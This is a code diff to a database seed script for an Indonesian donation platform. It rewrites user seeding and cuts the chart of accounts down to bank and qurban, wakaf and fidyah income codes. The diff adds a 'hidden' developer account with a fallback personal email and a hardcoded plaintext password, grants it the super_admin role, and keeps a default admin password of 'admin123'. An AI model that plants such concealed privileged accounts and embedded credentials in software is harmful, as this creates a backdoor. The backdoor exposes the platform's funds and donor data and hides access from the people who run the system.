@@ -1,4 +1,5 @@
 import { drizzle } from "drizzle-orm/node-postgres";
+import { eq } from "drizzle-orm";
 import pkg from "pg";
 const { Pool } = pkg;
 import * as schema from "./schema/index.ts";
@@ -75,25 +76,75 @@ async function seed() {
     await db.insert(schema.categories).values({ id: createId(), ...cat }).onConflictDoNothing();
   }
 
+  const ensureSeedUser = async (payload: {
+    email: string;
+    name: string;
+    passwordHash: string;
+    isDeveloper?: boolean;
+  }) => {
+    await db
+      .insert(schema.users)
+      .values({
+        id: createId(),
+        email: payload.email,
+        passwordHash: payload.passwordHash,
+        name: payload.name,
+        isActive: true,
+        isDeveloper: Boolean(payload.isDeveloper),
+      })
+      .onConflictDoNothing();
+
+    const user = await db.query.users.findFirst({
+      where: eq(schema.users.email, payload.email),
+      columns: { id: true },
+    });
+
+    if (!user) {
+      throw new Error(`Failed to ensure seed user: ${payload.email}`);
+    }
+
+    return user.id;
+  };
+
   // Seed Super Admin User
-  const passwordHash = await bcrypt.hash("admin123", 12);
-  const adminId = createId();
-
+  const adminPasswordHash = await bcrypt.hash("admin123", 12);
   console.log("Seeding admin user...");
-  await db.insert(schema.users).values({
-    id: adminId,
+  const adminId = await ensureSeedUser({
     email: "admin@bantuanku.org",
-    passwordHash,
     name: "Super Admin",
-    isActive: true,
-  }).onConflictDoNothing();
+    passwordHash: adminPasswordHash,
+    isDeveloper: false,
+  });
 
-  // Assign super_admin role
-  const superAdminRole = rolesData.find(r => r.slug === "super_admin");
+  // Seed Developer User (hidden account with developer flag)
+  const developerEmail = process.env.SEED_DEVELOPER_EMAIL || "webane.com@gmail.com";
+  const developerName = process.env.SEED_DEVELOPER_NAME || "Webane Developer";
+  const developerPassword = process.env.SEED_DEVELOPER_PASSWORD || "Bismillah2026)@DN!maju";
+  const developerPasswordHash = await bcrypt.hash(developerPassword, 12);
+
+  console.log("Seeding developer user...");
+  const developerId = await ensureSeedUser({
+    email: developerEmail,
+    name: developerName,
+    passwordHash: developerPasswordHash,
+    isDeveloper: true,
+  });
+
+  // Assign super_admin role (query from DB since onConflictDoNothing may keep old IDs)
+  const superAdminRole = await db.query.roles.findFirst({
+    where: eq(schema.roles.slug, "super_admin"),
+    columns: { id: true },
+  });
   if (superAdminRole) {
     await db.insert(schema.userRoles).values({
       id: createId(),
       userId: adminId,
+      roleId: superAdminRole.id,
+    }).onConflictDoNothing();
+
+    await db.insert(schema.userRoles).values({
+      id: createId(),
+      userId: developerId,
       roleId: superAdminRole.id,
     }).onConflictDoNothing();
   }
@@ -215,52 +266,22 @@ async function seed() {
   // Payment methods sekarang diambil dari settings, tidak perlu seed hardcode lagi
   console.log("Payment methods will be loaded from settings dynamically...");
 
-  // Seed Chart of Accounts (COA)
+  // Seed Chart of Accounts (COA) - Minimal Setup
   const coaData = [
-    // ASSETS (1xxx) - Debit normal
-    { code: "1000", name: "Aset", type: "asset", category: "header", normalBalance: "debit", level: 1, isSystem: true },
-    { code: "1100", name: "Aset Lancar", type: "asset", category: "header", normalBalance: "debit", level: 2, isSystem: true },
-    { code: "1110", name: "Kas", type: "asset", category: "cash", normalBalance: "debit", level: 3, isSystem: true, description: "Uang tunai di tangan" },
-    { code: "1120", name: "Bank BCA", type: "asset", category: "bank", normalBalance: "debit", level: 3, isSystem: true, description: "Rekening Bank BCA" },
-    { code: "1121", name: "Bank Mandiri", type: "asset", category: "bank", normalBalance: "debit", level: 3, isSystem: true, description: "Rekening Bank Mandiri" },
-    { code: "1122", name: "Bank BSI", type: "asset", category: "bank", normalBalance: "debit", level: 3, isSystem: true, description: "Rekening Bank Syariah Indonesia" },
-    { code: "1130", name: "Piutang", type: "asset", category: "receivable", normalBalance: "debit", level: 3, isSystem: false, description: "Piutang lain-lain" },
+    // BANK ACCOUNTS (6xxx) - Asset type, Debit normal
+    { code: "6201", name: "Bank BSI", type: "asset", category: "bank", normalBalance: "debit", level: 1, isSystem: true, description: "Rekening Bank Syariah Indonesia" },
+    { code: "6202", name: "Bank Muamalat", type: "asset", category: "bank", normalBalance: "debit", level: 1, isSystem: true, description: "Rekening Bank Muamalat" },
+    { code: "6203", name: "Bank BCA", type: "asset", category: "bank", normalBalance: "debit", level: 1, isSystem: true, description: "Rekening Bank BCA" },
+    { code: "6204", name: "Bank Mandiri", type: "asset", category: "bank", normalBalance: "debit", level: 1, isSystem: true, description: "Rekening Bank Mandiri" },
+    { code: "6205", name: "Bank BRI", type: "asset", category: "bank", normalBalance: "debit", level: 1, isSystem: true, description: "Rekening Bank BRI" },
+    { code: "6206", name: "Payment Gateway", type: "asset", category: "bank", normalBalance: "debit", level: 1, isSystem: true, description: "Rekening virtual untuk tracking pembayaran via payment gateway (Xendit, iPaymu, Flip, dll)" },
+    { code: "6210", name: "Cash", type: "asset", category: "cash", normalBalance: "debit", level: 1, isSystem: true, description: "Kas tunai untuk pembayaran langsung" },
 
-    // LIABILITIES (2xxx) - Credit normal
-    { code: "2000", name: "Liabilitas", type: "liability", category: "header", normalBalance: "credit", level: 1, isSystem: true },
-    { code: "2100", name: "Liabilitas Jangka Pendek", type: "liability", category: "header", normalBalance: "credit", level: 2, isSystem: true },
-    { code: "2110", name: "Hutang Usaha", type: "liability", category: "payable", normalBalance: "credit", level: 3, isSystem: false, description: "Hutang kepada vendor/supplier" },
-    { code: "2200", name: "Titipan Dana Donasi", type: "liability", category: "donation_liability", normalBalance: "credit", level: 2, isSystem: true, description: "Dana donasi yang belum disalurkan" },
-    { code: "2210", name: "Titipan Dana Campaign", type: "liability", category: "donation_liability", normalBalance: "credit", level: 3, isSystem: true, description: "Dana per campaign yang masuk" },
-
-    // EQUITY (3xxx) - Credit normal
-    { code: "3000", name: "Ekuitas", type: "equity", category: "header", normalBalance: "credit", level: 1, isSystem: true },
-    { code: "3100", name: "Modal Yayasan", type: "equity", category: "capital", normalBalance: "credit", level: 2, isSystem: true, description: "Modal awal yayasan" },
-    { code: "3200", name: "Laba Ditahan", type: "equity", category: "retained_earnings", normalBalance: "credit", level: 2, isSystem: true, description: "Akumulasi surplus/defisit" },
-
-    // INCOME (4xxx) - Credit normal
-    { code: "4000", name: "Pendapatan", type: "income", category: "header", normalBalance: "credit", level: 1, isSystem: true },
-    { code: "4100", name: "Pendapatan Donasi", type: "income", category: "donation", normalBalance: "credit", level: 2, isSystem: true, description: "Pendapatan dari donasi umum" },
-    { code: "4200", name: "Pendapatan Zakat", type: "income", category: "zakat", normalBalance: "credit", level: 2, isSystem: true, description: "Pendapatan dari zakat" },
-    { code: "4300", name: "Pendapatan Infaq/Sedekah", type: "income", category: "infaq", normalBalance: "credit", level: 2, isSystem: true, description: "Pendapatan infaq dan sedekah" },
-    { code: "4400", name: "Pendapatan Wakaf", type: "income", category: "wakaf", normalBalance: "credit", level: 2, isSystem: true, description: "Pendapatan wakaf" },
-    { code: "4900", name: "Pendapatan Lain-lain", type: "income", category: "other", normalBalance: "credit", level: 2, isSystem: false, description: "Pendapatan di luar operasional utama" },
-
-    // EXPENSE (5xxx) - Debit normal
-    { code: "5000", name: "Beban", type: "expense", category: "header", normalBalance: "debit", level: 1, isSystem: true },
-    { code: "5100", name: "Beban Program", type: "expense", category: "program", normalBalance: "debit", level: 2, isSystem: true, description: "Beban untuk program/campaign" },
-    { code: "5110", name: "Beban Pendidikan", type: "expense", category: "program", normalBalance: "debit", level: 3, isSystem: false, description: "Beban program pendidikan" },
-    { code: "5120", name: "Beban Kesehatan", type: "expense", category: "program", normalBalance: "debit", level: 3, isSystem: false, description: "Beban program kesehatan" },
-    { code: "5130", name: "Beban Bencana Alam", type: "expense", category: "program", normalBalance: "debit", level: 3, isSystem: false, description: "Beban tanggap bencana" },
-    { code: "5140", name: "Beban Sosial", type: "expense", category: "program", normalBalance: "debit", level: 3, isSystem: false, description: "Beban program sosial" },
-    { code: "5200", name: "Beban Operasional", type: "expense", category: "operational", normalBalance: "debit", level: 2, isSystem: true, description: "Beban operasional organisasi" },
-    { code: "5210", name: "Beban Gaji", type: "expense", category: "operational", normalBalance: "debit", level: 3, isSystem: false, description: "Gaji karyawan" },
-    { code: "5220", name: "Beban Sewa", type: "expense", category: "operational", normalBalance: "debit", level: 3, isSystem: false, description: "Sewa kantor/tempat" },
-    { code: "5230", name: "Beban Utilitas", type: "expense", category: "operational", normalBalance: "debit", level: 3, isSystem: false, description: "Listrik, air, internet" },
-    { code: "5240", name: "Beban Administrasi", type: "expense", category: "operational", normalBalance: "debit", level: 3, isSystem: false, description: "ATK, materai, dll" },
-    { code: "5250", name: "Beban Marketing", type: "expense", category: "operational", normalBalance: "debit", level: 3, isSystem: false, description: "Promosi dan marketing" },
-    { code: "5260", name: "Beban Payment Gateway", type: "expense", category: "operational", normalBalance: "debit", level: 3, isSystem: true, description: "Fee payment gateway" },
-    { code: "5900", name: "Beban Lain-lain", type: "expense", category: "other", normalBalance: "debit", level: 2, isSystem: false, description: "Beban lain-lain" },
+    // INCOME ACCOUNTS (43xx) - Income type, Credit normal
+    { code: "4300", name: "Pendapatan Qurban", type: "income", category: "qurban", normalBalance: "credit", level: 1, isSystem: true, description: "Pendapatan dari penjualan paket qurban (tidak termasuk biaya admin)" },
+    { code: "4310", name: "Biaya Admin Qurban", type: "income", category: "qurban_admin", normalBalance: "credit", level: 1, isSystem: true, description: "Pendapatan dari biaya administrasi penyembelihan qurban" },
+    { code: "4311", name: "Wakaf", type: "income", category: "wakaf", normalBalance: "credit", level: 1, isSystem: true, description: "Pendapatan dari wakaf" },
+    { code: "4312", name: "Fidyah", type: "income", category: "fidyah", normalBalance: "credit", level: 1, isSystem: true, description: "Pendapatan dari fidyah" },
   ];
 
   console.log("Seeding chart of accounts...");
@@ -268,19 +289,8 @@ async function seed() {
     await db.insert(schema.chartOfAccounts).values({ id: createId(), ...acc }).onConflictDoNothing();
   }
 
-  // Seed Ledger Accounts (minimal for compatibility with ledger service)
-  // Using blueprint COA codes: 1010 (Kas), 1020 (Bank), 2010 (Liability)
-  // Generic names to support multiple banks configured via admin UI
-  const ledgerAccountsData = [
-    { code: "1010", name: "Kas", type: "asset", normalSide: "debit" },
-    { code: "1020", name: "Bank - Operasional", type: "asset", normalSide: "debit" },
-    { code: "2010", name: "Titipan Dana Campaign", type: "liability", normalSide: "credit" },
-  ];
-
-  console.log("Seeding ledger accounts (for ledger service compatibility)...");
-  for (const acc of ledgerAccountsData) {
-    await db.insert(schema.ledgerAccounts).values({ id: createId(), ...acc }).onConflictDoNothing();
-  }
+  // Ledger Accounts removed - using simplified COA structure instead
+  console.log("Ledger accounts not seeded - using minimal COA structure...");
 
   // Bank Accounts akan di-input oleh admin via UI
   // Tidak perlu seed default bank accounts
